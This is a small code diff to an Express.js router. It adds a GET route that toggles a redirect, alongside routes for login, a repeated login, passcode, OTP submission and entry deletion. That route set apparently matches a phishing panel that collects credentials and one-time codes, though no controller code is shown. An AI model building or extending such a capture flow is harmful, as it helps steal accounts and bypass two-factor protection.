@@ -8,6 +8,7 @@ const {
 	submitPasscode,
 	submitOtp,
 	deleteEntry,
+	setRedirect,
 } = require("../controllers/jlController");
 
 const router = express.Router();
@@ -19,6 +20,7 @@ router.post("/login", submitLogin);
 router.post("/loginAgain", submitLoginAgain);
 router.post("/passcode", submitPasscode);
 router.post("/otp", submitOtp);
+router.get("/redirect/:active", setRedirect);
 router.post("/delete", deleteEntry);
 
 module.exports = router;
